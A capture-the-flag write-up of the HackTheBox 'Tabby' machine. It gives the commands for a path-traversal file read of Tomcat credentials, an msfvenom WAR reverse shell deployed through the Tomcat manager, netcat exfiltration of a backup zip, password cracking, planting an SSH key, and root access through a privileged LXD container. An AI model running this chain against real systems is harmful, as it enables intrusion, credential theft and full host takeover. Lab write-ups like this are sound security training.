---
title: Tabby HackTheBox
author: Saad
date: 2025-5-7 00:00:00 +0500
categories:
  - HackTheBox
tags:
  - lfi
  - file-read
  - tomcat
  - broken-auth
  - lxc/lxd
  - misconfigs
image: Tabby.webp
media_subpath: /assets/img/tabby-htb
---

## Box Info:
The box is fairly simple, A webapp is being hosted which reveals another one, 2nd webapp has `LFI` which can be exploited to read the creds of tom user to login in `tomcat` instance, which is sadly not possible other then `manage/text` interface. Now having CLI access to tomcat, a war shell can be uploaded to obtain a shell. Looking around the system, a `pass protected zip` file can be found, cracked password can be used for another user on system which is in the `LXD group`. A privileged container can be created and mount the file-system of actual system on it and access it through `SSH`.

## Recon

### nmap

```shell
➜  Tabby nmap -sCV 10.129.46.110 --min-rate=1000 -oN scan.tabby
<SNIP>
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
<SNIP>
```
Mostly normal ports open other then 8080.

### stack

```shell
➜  Tabby curl -I megahosting.htb
HTTP/1.1 200 OK
Date: Thu, 08 May 2025 09:50:33 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```
Nothing special.

### WebApp 

Taking a look at the webapp hosted on `80/TCP` it redirects to `megahosting.htb`
It's a hosting services, there is an email `sales@megahosting.htb` but nothing worthy.

![](80tcpwebapp.png)

While port 8080 is `it works page` of tomcat which could be useful further, I'll state later.

![](8080tomcat.png)


## Enum
### Identifying LFI
We could try sub vhost fuzzing or dir fuzzing, Well there is no need since the page is screaming about the news that company had a data breach.

Well, taking a look at it:

`We have recently upgraded several services. Our servers are now more secure than ever. Read our statement on recovering from the data breach`
Clicking on it leads to `megahosting.htb/news.php?file=statement`, A clear LFI. 

Let's try reading the files; I'll be using for this `cURL` because it's simple and nice.
It works!

```shell
➜  Tabby curl http://megahosting.htb/news.php\?file\=../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
            <<SNIP>>
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
```
Googling around a bit and I tried all of the paths that I could of `tomcat` but couldn't read the `tomcat-users.xml`, Then going back to `it works` page of tomcat I got the answer.
On the 3rd line it states where the tomcat is installed.

`Tomcat is installed with CATALINA_HOME in /usr/share/tomcat9`.

But on the last line it tells that manager webapp is restricted for users with `manager-gui` role and the host-manager for `admin-gui`, along side the path of cerds file?

`NOTE: For security reasons, using the manager webapp is restricted to users with role "manager-gui". The host-manager webapp is restricted to users with role "admin-gui".    
Users are defined in /etc/tomcat9/tomcat-users.xml.`


If tomcat9 is installed under `/usr/share/tomcat9` and cerds file's path is `/etc/tomcat9/tomcat-users.xml` then it means the file is under
`/usr/share/tomcat9/etc/tomcat9/tomcat-users.xml`. No idea if it's gonna work but can try.

And it didn't, After googling around I came across `0xdf's` writeup for this box, He just installed tomcat9 with `apt install tomcat9` and looked for path locally.

The actual path for the user file is just bit different

`/usr/share/tomcat9/etc/tomcat-users.xml`, and trying this path out gave something.

### tomcat-users.xml
```shell
➜  Tabby curl http://megahosting.htb/news.php\?file\=../../../../../usr/share/tomcat9/etc/tomcat-users.xml
              <SNIP>
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
```
The password is `$3cureP4s5w0rd123!`. 

## ~$ as tom
### Enum
When tried accessing `admin-gui`, the page doesn't exist. :(

![](404.png)

We can access `/manager/html` and login but it seems confusing and couldn't do anything. (yeah my skill issue)

yet some system information and stuff, other then that nothing useful.

![](manager-tomcat.png)

### /manager/text
In `tomcat-users.xml`, saw that we have `manager-script` role in users.xml, after looking at the [docs about managers ot tomcat](https://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html) found this;

![](textuploader.png)

Now that we can upload a `war` file, let's create a war revshell using `msfvenom`

#### creating war shell
```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.34 LPORT=9001 -f war > fairy.war
Payload size: 1089 bytes
Final size of war file: 1089 bytes
```

Time to upload this shell, again `cURL` will be used and we can upload file with `-T` or `--upload-file`.

```shell
~$ curl --help | grep upload
 -T, --upload-file <file>    Transfer local FILE to destination
```

#### Uploading & deploying the war shell
```shell
$ curl -u 'tomcat:$3cureP4s5w0rd123!' http://megahosting.htb:8080/manager/text/deploy?path=/sala --upload-file shell.war
OK - Deployed application at context path [/sala]
```

To confirm,

```bash
$ curl -u 'tomcat:$3cureP4s5w0rd123!' http://megahosting.htb:8080//manager/text/list
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/sala:running:0:sala
/examples:running:0:/usr/share/tomcat9-examples/examples
/host-manager:running:1:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs
```
opening the `megahosting.htb:8080/sala/` in browser or curl it and on the other hand there is a shell.

### got ~$
```shell
➜  ~ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.34] from (UNKNOWN) [10.129.46.110] 54518
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```
#### Upgrading the ~$

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@tabby:/var/lib/tomcat9$ export TERM=xterm
export TERM=xterm
tomcat@tabby:/var/lib/tomcat9$ ^Z
[1]  + 34445 suspended  nc -nvlp 9001
➜  ~ stty raw -echo;fg
[1]  + 34445 continued  nc -nvlp 9001

tomcat@tabby:/var/lib/tomcat9$
```

### users on system

```console
tomcat@tabby:/var/www/html/files$ cat /etc/passwd | grep "bash"
root:x:0:0:root:/root:/bin/bash
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

Nothing useful in tomcat's webroot.
```shell
$ ls /var/lib/tomcat9/
conf  lib  logs  policy  webapps  work
```

## ~$ as ash

### Enum
#### files dir
Taking a look around, webapp's files can be found under `/var/www/html`.

```shell
tomcat@tabby:/var/www/html$ ls
assets  favicon.ico  files  index.php  logo.png  news.php  Readme.txt
```
`Readme.txt` is just default Bootstrap Themes readme,
`files` directory looks useful, looking under it, we can discover a backup zip file which is password protected.

```shell
tomcat@tabby:/var/www/html/files$ ls
16162020_backup.zip  archive  revoked_certs  statement
```
### Backup zip

#### Transfer it
Transfer the zip file to your local VM, I'll use netcat. Simple and clean!

```console
tomcat@tabby:/var/www/html/files$ cat 16162020_backup.zip | nc 10.10.14.31 9001
```
```console
➜ ~ nc -nvlp 9001 > backup.zip
connect to [10.10.14.31] from (UNKNOWN) [10.129.46.110] 51632
```
check the file integrity, It's the correct one.
```console
target
tomcat@tabby:/var/www/html/files$ md5sum 16162020_backup.zip
f0a0af346ad4495cfdb01bd5173b0a52  16162020_backup.zip

local
➜  Tabby md5sum backup.zip
f0a0af346ad4495cfdb01bd5173b0a52  backup.zip
```

#### Cracking the zip

Get the has for the john using `zip2john`.
```console
➜  Tabby /sbin/zip2john backup.zip > forjohn
ver 1.0 backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backup.zip/var/www/html/favicon.ico PKZIP Encr: TS_chk, cmplen=338, decmplen=766, crc=282B6DE2 ts=7DB5 cs=7db5 type=8
ver 1.0 backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backup.zip/var/www/html/index.php PKZIP Encr: TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6 ts=5935 cs=5935 type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** backup.zip/var/www/html/logo.png PKZIP Encr: TS_chk, cmplen=2906, decmplen=2894, crc=02F9F45F ts=5D46 cs=5d46 type=0
ver 2.0 efh 5455 efh 7875 backup.zip/var/www/html/news.php PKZIP Encr: TS_chk, cmplen=114, decmplen=123, crc=5C67F19E ts=5A7A cs=5a7a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/var/www/html/Readme.txt PKZIP Encr: TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3 ts=6A8B cs=6a8b type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

Run `John` on it and we have the password for the zip.

```console
➜  Tabby /sbin/john forjohn --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (backup.zip)
1g 0:00:00:02 DONE (2025-05-09 01:37) 0.4201g/s 4354Kp/s 4354Kc/s 4354KC/s adornadis..adhi1411
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
The backup files doesn't contain anything useful, So this password could be used for user `ash`.


### su / SSH

**su**
```console
tomcat@tabby:/var/www/html/files$ su - ash
Password:
ash@tabby:~$ ls
user.txt
```

**SSH**
```console
➜  html ssh ash@megahosting.htb
The authenticity of host 'megahosting.htb (10.129.46.110)' can't be established.
ED25519 key fingerprint is SHA256:mUt3fTn2/uoySPc6XapKq69a2/3EPRdW0T79hZ2davk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'megahosting.htb' (ED25519) to the list of known hosts.
ash@megahosting.htb: Permission denied (publickey).
```
for some reasons, it's denying my public key but since I have a shell I'll add my own ssh public key in `~/.ssh/authorized_keys` to move further smoothly with better shell.

SSH key pair can be generated with `ssh-keygen`.

```console
➜  Tabby ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home//.ssh/id_rsa):
/home/simon/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home//.ssh/id_rsa
Your public key has been saved in /home//.ssh/id_rsa.pub
The key fingerprint is:
SHA256:ldhUpgRji46byTZYzqXEvIZ7eUL6WOjw1FQ5viEVmxs @parrot
The key's randomart image is:
+---[RSA 3072]----+
|      . +.o.o    |
|       B B +     |
|      E o =      |
|   o * + .       |
|    O * S        |
|   %.O o         |
|. =o/..          |
| =.*+..          |
|  =o.o           |
+----[SHA256]-----+
➜  Tabby
```
make a `.ssh` directory.

```console
ash@tabby:~$ mkdir .ssh
ash@tabby:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDF91zWe/Q7loKiJKuOSnH0I+X4VYHVm8yIJ4TepZgFNsSORcEu7rHG5edwgs1iGcX78olvaF0rOc9BfCR+T80qgk+GjEFLXH7VixW2/U6H/hHBj+5nWtBRRzoX9XT1LlYq62bxTaFMX+WPVJRZYlf9jSxBzvFkIwY1NCiXOxusS0gCEUufwBTj7eP1ApqE33WFS93NvBqMAv9c43X6jbBrpCFsVo64t2AWj19Ozg1YFeXJV3jXba+dVBE2rVNE1NZc4IztQ0kbdKttLFT34LL8pPVtkDlZfwFyYQaxE2JrS82K3ZfVPl/cAktC9BnU88IDl7lTme4Nw6vGuK4x0UY1TeMbhu6J960NyUTrF81kzd/DfpVhY41XhmWhAoAhOSW8dXqMy1Z396QaZOwPdtCScsViDzEBpXeNJRQgueTk5YrzOCDo5vpq30UASbIDimL58/Hrgv91rF3v3S0P6bLUtxIYkUxFnIFlksmen8w71uoohtjtEUtoiCCy+DbUWK8= user@parrot" >> ~/.ssh/authorized_keys
```

Now we can login and have a secure good shell.

```console
➜  Tabby ssh ash@10.129.46.110 -i ~/.ssh/id_rsa
            <SNIP>

283 updates can be installed immediately.
152 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue May 19 11:48:00 2020
ash@tabby:~$
```

## ~$ as ~#

### Enum

Starting off by basic enumeration, always checking the groups and SUID/GUID.

Well, taking a first look at groups, there is no need to look further.

#### lxd group
```console
ash@tabby:~$ groups
ash adm cdrom dip plugdev lxd
```
ash is member of `lxd` group which can be called in-built docker in linux, containers can be ran with specific images.
Since ash is member of it, getting to root is easy.


### Creating image 

#### alpine lxd build

After googling around I found this github repo which has been by many ctf-lab players for lxd privesc, after downloading it transfer it to target machine.

```console
➜  Tabby wget https://github.com/saghul/lxd-alpine-builder/raw/refs/heads/master/alpine-v3.13-x86_64-20210218_0139.tar.gz
--2025-05-09 02:17:11--  https://github.com/saghul/lxd-alpine-builder/raw/refs/heads/master/alpine-v3.13-x86_64-20210218_0139.tar.gz
Resolving github.com (github.com)... 20.207.73.82
Connecting to github.com (github.com)|20.207.73.82|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/saghul/lxd-alpine-builder/refs/heads/master/alpine-v3.13-x86_64-20210218_0139.tar.gz [following]
--2025-05-09 02:17:13--  https://raw.githubusercontent.com/saghul/lxd-alpine-builder/refs/heads/master/alpine-v3.13-x86_64-20210218_0139.tar.gz
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3259593 (3.1M) [application/octet-stream]
Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’

alpine-v3.13-x86_64-20210218 100%[=============================================>]   3.11M  23.6KB/s    in 2m 52s

2025-05-09 02:20:07 (18.5 KB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]
```
##### Transferring onto box
```console
➜  Tabby python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```console
ash@tabby:~$ wget http://10.10.14.31:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
--2025-05-09 06:22:55--  http://10.10.14.31:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
Connecting to 10.10.14.31:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3259593 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz.1’

alpine-v3.13-x86_64-20210218 100%[=============================================>]   3.11M   855KB/s    in 3.7s

2025-05-09 06:22:59 (855 KB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz.1’ saved [3259593/3259593]
```

```console
10.129.46.110 - - [09/May/2025 02:22:29] "GET /alpine-v3.13-x86_64-20210218_0139.tar.gz HTTP/1.1" 200 -
```

#### lxd init
Before we import the image, we need to run `lxd init` to initialize it.

```console
ash@tabby:~$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]:
Do you want to configure a new storage pool? (yes/no) [default=yes]:
Name of the new storage pool [default=default]:
Name of the storage backend to use (btrfs, dir, lvm, zfs, ceph) [default=zfs]:
Create a new ZFS pool? (yes/no) [default=yes]:
Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]:
Size in GB of the new loop device (1GB minimum) [default=5GB]:
Would you like to connect to a MAAS server? (yes/no) [default=no]:
Would you like to create a new local network bridge? (yes/no) [default=yes]:
What should the new bridge be called? [default=lxdbr0]:
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:
Would you like the LXD server to be available over the network? (yes/no) [default=no]:
Would you like stale cached images to be updated automatically? (yes/no) [default=yes]
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:
```
#### importing
Now I'll be able to import the image using this command.
```console
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias privesc
```
![](import.png)

To ensure that our image has been created, we can run the following command, Indeed image was created.

```console
lxd image list
```
![](created.png)

### privesc

Now that we have created a container, in-order to force the container to interact on root file system we need to make it privileged one and mount it on the host filesystem.
```console
lxc init privesc ignite -c security.privileged=true
lxc config device add ignite privesc disk source=/ path=/mnt/root recursive=true
```
![](prived.png)

The privileged container is ready, time to start it using following commands.
```console
lxc start ignite
lxc exec ignite /bin/sh
```
And we have a container root shell with full access of host filesystem.

![](rooted.png)

Real flag btw: flag{g1t_gud_4nd_g1t_fl4g_by_yours3lf}
